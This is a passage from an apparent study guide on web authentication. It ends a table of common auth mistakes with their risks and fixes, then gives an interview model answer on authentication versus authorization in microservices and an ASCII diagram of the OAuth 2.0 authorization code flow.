| Password stored as MD5 | Cracked in seconds with rainbow tables or brute force | bcrypt with cost factor ≥ 12 |
| Same secret for access + refresh | Compromising one compromises both token types | Different secrets for each token type |
| No rate limiting on login | Attacker brute-forces passwords at 1000 attempts/second | 5 attempts per 15 min per IP+email |
| Revealing "email not found" | Attacker enumerates valid emails for phishing | Always "Invalid credentials" regardless |
| Refresh token without rotation | Stolen refresh token works forever (until expiry) | Rotation + reuse detection |
| Storing session in memory | Server restart = all users logged out; can't scale horizontally | External store (Redis) |

> **Interview Callout:** "Explain the difference between authentication and authorization. How would you implement both in a microservices architecture?"
>
> **Model answer:** "Authentication verifies identity — 'who are you?' Authorization determines permissions — 'what can you do?' In a microservices architecture, I'd use JWT-based auth: a dedicated Auth Service handles login and issues JWTs. Each microservice validates the JWT independently (using shared public key with RS256) without calling the Auth Service — this keeps services decoupled. The JWT payload contains the user's roles/permissions, so each service can make authorization decisions locally. For sensitive operations, services can make a gRPC call to a centralized Permission Service that handles complex RBAC/ABAC rules."

---

## 16 — OAuth 2.0 Flow Diagram (Quick Reference)

```
┌─────────────────────────────────────────────────────────────┐
│                  OAUTH 2.0 AUTHORIZATION CODE FLOW            │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  [User]  ──1──►  [Your App]                                  │
│    │               │                                          │
│    │◄──2── 302 to Google ──────►  [Google OAuth]              │
│    │                                    │                     │
│    │──3── User logs in + consents ────►│                     │
│    │                                    │                     │
│    │◄──4── redirect_uri?code=XYZ ─────│                     │
│    │                                                          │
│    │──5──►  [Your App Backend]                               │
│             │                                                 │
│             │──6── POST /token {code, secret} ──► [Google]   │
│             │◄─── {access_token, id_token} ──────│           │
│             │                                                 │
│             │──7── GET /userinfo ──────────────► [Google API] │
│             │◄─── {email, name, picture} ────────│           │
│             │                                                 │
│             │──8── Create local user + session                │
│    │◄──────│── Set-Cookie: session/jwt                       │
│    │                                                          │
│  [User logged in! 🎉]                                        │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```
